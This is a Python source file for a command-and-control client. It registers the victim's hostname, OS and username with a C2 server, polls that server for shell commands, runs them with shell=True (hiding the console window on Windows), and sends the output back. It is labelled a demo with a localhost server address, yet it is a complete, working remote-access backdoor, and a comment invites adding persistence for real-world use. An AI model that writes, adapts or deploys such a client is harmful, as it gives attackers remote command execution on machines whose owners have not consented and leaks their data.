import requests
import platform
import socket
import getpass
import subprocess
import time
import os
import json
import uuid

# Configuration
C2_SERVER = "http://localhost:5000"  # Change this to your server address
HEARTBEAT_INTERVAL = 5  # Seconds between heartbeat checks
MAX_RETRIES = 3  # Maximum number of retries for failed requests

# For a real-world scenario, you'd implement persistence and other features
class Client:
    def __init__(self):
        self.client_id = None
        self.client_info = {
            'hostname': socket.gethostname(),
            'os_info': f"{platform.system()} {platform.release()}",
            'username': getpass.getuser()
        }
        self.session = requests.Session()
        self.config_dir = os.path.join(os.path.expanduser("~"), ".demo_client")
        self.processed_commands = set()  # Track processed commands to avoid duplicates
        
        # Create config directory if it doesn't exist
        if not os.path.exists(self.config_dir):
            os.makedirs(self.config_dir)
        
        # Try to load existing client ID
        self.load_client_id()
    
    def load_client_id(self):
        """Load client ID from saved file if it exists"""
        config_file = os.path.join(self.config_dir, "config.json")
        if os.path.exists(config_file):
            try:
                with open(config_file, 'r') as f:
                    data = json.load(f)
                    self.client_id = data.get('client_id')
                    print(f"Loaded existing client ID: {self.client_id}")
            except Exception as e:
                print(f"Error loading client ID: {e}")
                self.client_id = None
    
    def save_client_id(self):
        """Save client ID to file"""
        config_file = os.path.join(self.config_dir, "config.json")
        try:
            with open(config_file, 'w') as f:
                json.dump({'client_id': self.client_id}, f)
        except Exception as e:
            print(f"Error saving client ID: {e}")
    
    def register(self):
        """Register with the C2 server"""
        if self.client_id is None:
            for retry in range(MAX_RETRIES):
                try:
                    print(f"Attempting to register with server at {C2_SERVER}/api/register (Attempt {retry+1})")
                    response = self.session.post(
                        f"{C2_SERVER}/api/register",
                        json=self.client_info,
                        timeout=10
                    )
                    if response.status_code == 200:
                        data = response.json()
                        self.client_id = data.get('client_id')
                        print(f"Registered with server. Client ID: {self.client_id}")
                        self.save_client_id()
                        return True
                    else:
                        print(f"Registration failed: {response.status_code} - {response.text}")
                except Exception as e:
                    print(f"Error during registration: {e}")
                
                # Wait before retrying
                time.sleep(2)
            
            print("Failed to register after maximum retries")
            return False
        
        return True
    
    def heartbeat(self):
        """Send heartbeat to C2 server and get commands"""
        if self.client_id is None:
            success = self.register()
            if not success:
                return
        
        try:
            print(f"Sending heartbeat to {C2_SERVER}/api/heartbeat/{self.client_id}")
            response = self.session.post(
                f"{C2_SERVER}/api/heartbeat/{self.client_id}",
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'ok':
                    commands = data.get('commands', [])
                    print(f"Received {len(commands)} commands from server")
                    
                    # Process each command
                    for cmd in commands:
                        command_id = cmd.get('id')
                        
                        # Check if we've already processed this command to avoid duplicates
                        if command_id not in self.processed_commands:
                            self.processed_commands.add(command_id)
                            self.execute_command(cmd)
                        else:
                            print(f"Skipping already processed command {command_id}")
                else:
                    print(f"Heartbeat error: {data.get('message')}")
                    # If client is not found, re-register
                    if data.get('message') == 'Client not found':
                        self.client_id = None
                        self.register()
            else:
                print(f"Heartbeat failed: {response.status_code} - {response.text}")
                if response.status_code == 404:
                    print("Client ID not recognized by server, re-registering...")
                    self.client_id = None
                    self.register()
        except Exception as e:
            print(f"Error during heartbeat: {e}")
    
    def execute_command(self, command_data):
        """Execute a command from the C2 server"""
        command_id = command_data.get('id')
        command = command_data.get('command')
        
        print(f"Executing command ID {command_id}: {command}")
        
        try:
            # Execute the command
            if platform.system() == "Windows":
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            else:
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
            
            stdout, stderr = process.communicate(timeout=30)
            
            if stderr:
                result = f"Exit code: {process.returncode}\nSTDERR: {stderr.decode('utf-8', errors='replace')}"
            else:
                result = stdout.decode('utf-8', errors='replace')
            
            if not result.strip():
                result = "(Command executed successfully but returned no output)"
            
            print(f"Command execution complete. Result length: {len(result)}")
            print(f"First 100 chars of result: {result[:100]}")
            
            # Send the result back to the server
            success = False
            for retry in range(MAX_RETRIES):
                if self.send_result(command_id, result):
                    success = True
                    break
                time.sleep(1)
            
            if not success:
                print(f"Failed to send result for command {command_id} after {MAX_RETRIES} attempts")
            
        except subprocess.TimeoutExpired:
            process.kill()
            self.send_result(command_id, "Command execution timed out after 30 seconds")
        except Exception as e:
            error_msg = f"Error executing command: {str(e)}"
            print(error_msg)
            self.send_result(command_id, error_msg)
    
    def send_result(self, command_id, result):
        """Send command result back to the C2 server"""
        try:
            print(f"Sending result for command {command_id} to {C2_SERVER}/api/command_result/{self.client_id}")
            response = self.session.post(
                f"{C2_SERVER}/api/command_result/{self.client_id}",
                json={
                    'command_id': command_id,
                    'result': result
                },
                timeout=10
            )
            if response.status_code == 200:
                print(f"Successfully sent result to server")
                data = response.json()
                print(f"Server response: {data}")
                return True
            else:
                print(f"Failed to send result: {response.status_code} - {response.text}")
                return False
        except Exception as e:
            print(f"Error sending result: {e}")
            return False
    
    def run(self):
        """Main client loop"""
        print("Starting client...")
        
        if not self.register():
            print("Failed to register with server. Retrying in 30 seconds...")
            time.sleep(30)
            if not self.register():
                print("Failed to register after retry. Exiting.")
                return
        
        # Limit the size of processed_commands set to avoid memory issues
        def clean_processed_commands():
            if len(self.processed_commands) > 1000:
                # Keep only the 500 most recent commands
                self.processed_commands = set(list(self.processed_commands)[-500:])
        
        failure_count = 0
        max_failures = 10
        
        while True:
            try:
                self.heartbeat()
                # Reset failure count on successful heartbeat
                failure_count = 0
                
                # Clean up processed commands periodically
                clean_processed_commands()
                
                time.sleep(HEARTBEAT_INTERVAL)
            except Exception as e:
                print(f"Error in main loop: {e}")
                failure_count += 1
                
                if failure_count >= max_failures:
                    print("Too many consecutive failures. Restarting client...")
                    failure_count = 0
                    # Re-register with server
                    self.client_id = None
                    self.register()
                
                # Increase wait time between retries
                time.sleep(HEARTBEAT_INTERVAL * 2)

if __name__ == "__main__":
    client = Client()
    client.run()
